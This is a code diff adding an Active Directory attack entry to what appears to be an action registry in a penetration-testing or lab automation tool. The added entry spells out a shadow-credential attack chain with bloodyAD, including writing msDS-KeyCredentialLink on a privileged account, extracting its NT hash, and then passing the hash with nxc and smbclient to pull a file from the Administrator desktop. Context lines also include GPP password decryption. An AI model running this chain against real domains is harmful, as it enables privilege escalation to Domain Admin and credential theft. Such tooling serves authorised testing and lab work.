@@ -272,6 +272,21 @@ ACTION_REGISTRY: dict[str, Action] = {
         ["gpp-decrypt <cpassword>  # from Groups.xml in SYSVOL"],
         risk="read_only", runnable=False, outputs="raw",
         note="Recover the GPP-stored password (AES key is public); reuse across the domain."),
+    "bloodyad_shadow_cred": _a("bloodyad_shadow_cred",
+        ["# 1) confirm the writable Tier-0 object (GenericWrite/WriteDACL/AddKeyCredentialLink):",
+         "bloodyAD -d $DOMAIN -u <USER> -p '<PASS>' --host $IP get writable --detail "
+         "| grep -B50 msDS-KeyCredentialLink",
+         "# 2) write the shadow credential — bloodyAD does keypair -> msDS-KeyCredentialLink "
+         "-> PKINIT AS-REQ -> U2U NT-hash extraction in one step:",
+         "bloodyAD -d $DOMAIN -u <USER> -p '<PASS>' --host $IP add shadowCredentials <TARGET>",
+         "# 3) pass-the-hash the recovered DA NT hash and take the proof:",
+         "nxc smb $IP -u <TARGET> -H <NTHASH> -d $DOMAIN",
+         "smbclient //$IP/C$ -U '$DOMAIN/<TARGET>' --pw-nt-hash <NTHASH> "
+         "-c 'get Users\\Administrator\\Desktop\\proof.txt proof.txt'"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Shadow credential: a low-priv domain cred with GenericWrite over a Domain Admins "
+             "member -> msDS-KeyCredentialLink -> PKINIT -> NT hash -> PtH -> DA. Gated on the "
+             "BloodHound fact shadow_cred_target."),
 
     # --- Traditional: MSSQL / WinRM / SSH / RDP / FTP ---
     "netexec_mssql": _a("netexec_mssql", ["nxc mssql $IP -u '' -p ''"], outputs="raw"),
